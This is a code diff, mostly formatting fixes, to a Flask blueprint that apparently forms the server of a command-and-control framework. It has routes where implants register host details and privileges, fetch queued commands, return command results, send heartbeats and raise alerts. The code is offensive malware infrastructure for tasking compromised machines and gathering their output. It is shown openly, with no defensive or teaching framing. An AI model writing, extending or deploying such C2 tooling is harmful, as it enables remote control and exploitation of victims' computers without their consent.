@@ -10,12 +10,14 @@ from sqlalchemy.exc import IntegrityError
 from werkzeug.security import check_password_hash, generate_password_hash
 
 from .db import db
-from .models import Implant , Command , Alert
+from .models import Implant, Command, Alert
 
 bp = Blueprint('implant', __name__)
 
 # register
-@bp.route('/register', methods=('POST'))
+
+
+@bp.route('/register', methods=['POST'])
 def register():
     try:
         if request.method == 'POST':
@@ -45,9 +47,9 @@ def register():
                         implant.last_seen = last_seen
 
                         db.session.commit()
-                    
+
                         print("Implant updated")
-                    
+
                     else:
                         implant = Implant(
                             implant_id=imp_id,
@@ -56,7 +58,7 @@ def register():
                             computer_GUID=computer_GUID,
                             computer_privileges=cmp_prev,
                             connecting_ip_address=ip,
-                            #session_key=session_key,
+                            # session_key=session_key,
                             first_seen=first_seen,
                             last_seen=last_seen
                         )
@@ -67,21 +69,22 @@ def register():
                     pass
             else:
                 print("Alert: somone is trying to play with us")
-            
+
             flash(error)
     except:
         print("error")
         pass
-    
 
-@bp.route('/getNextCommand', methods=('POST'))
+
+@bp.route('/getNextCommand', methods=['POST'])
 def get_next_command():
     if request.method == 'POST':
         try:
             impl_id = request.json["implant_id"]
 
             if impl_id:
-                commands = Command.query.filter(implant_id=impl_id,status="not_taken_by_implant")
+                commands = Command.query.filter(
+                    implant_id=impl_id, status="not_taken_by_implant")
                 if commands:
                     first_value = commands.first()
                     command = first_value.command_text
@@ -89,16 +92,16 @@ def get_next_command():
                     current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                     cmd_id = first_value.command_id
                     first_value.time_issued = current_date_time
-                    first_value.status="taken_by_implant"
+                    first_value.status = "taken_by_implant"
                     db.session.commit()
-                    return jsonify({"command_id" : cmd_id, "command": command})
+                    return jsonify({"command_id": cmd_id, "command": command})
                 else:
-                    return jsonify({"command_id": -1 ,"command": "No command"})
+                    return jsonify({"command_id": -1, "command": "No command"})
         except:
             pass
 
 
-@bp.route('/sendCommandResult', methods=('POST'))
+@bp.route('/sendCommandResult', methods=['POST'])
 def store_command_results():
     if request.method == 'POST':
         try:
@@ -107,7 +110,7 @@ def store_command_results():
             result = request.json["result"]
 
             if impl_id:
-                commands = Command.query.filter(implant_id=impl_id,status="taken_by_implant",
+                commands = Command.query.filter(implant_id=impl_id, status="taken_by_implant",
                                                 command_id=cmd_id)
                 if commands:
                     commands.command_result = result
@@ -119,7 +122,8 @@ def store_command_results():
         except:
             pass
 
-@bp.route('/hearbeat', methods=('POST'))
+
+@bp.route('/hearbeat', methods=['POST'])
 def heartbeat():
     if request.method == 'POST':
         try:
@@ -129,27 +133,26 @@ def heartbeat():
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 implant.last_seen = current_date_time
-                return jsonify({"status":"keep Alive"})
+                return jsonify({"status": "keep Alive"})
             except:
-                return jsonify({"status" : "register first"})
+                return jsonify({"status": "register first"})
         except:
             pass
 
-@bp.route('/alert', methods=('POST'))
+
+@bp.route('/alert', methods=['POST'])
 def alert():
-    if request.method =='POST':
-        try:             
+    if request.method == 'POST':
+        try:
             imp_id = request.json['implant_id']
             alert = request.json['alert']
             try:
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
-                alert = Alert(implant_id=imp_id,time_reported=current_date_time,alert=alert)
-                return jsonify({"status":"Alert Registered"})
+                alert = Alert(implant_id=imp_id,
+                              time_reported=current_date_time, alert=alert)
+                return jsonify({"status": "Alert Registered"})
             except:
-                return jsonify({"status":"Bad alert"})
+                return jsonify({"status": "Bad alert"})
         except:
-           pass  
-
-
-
+            pass
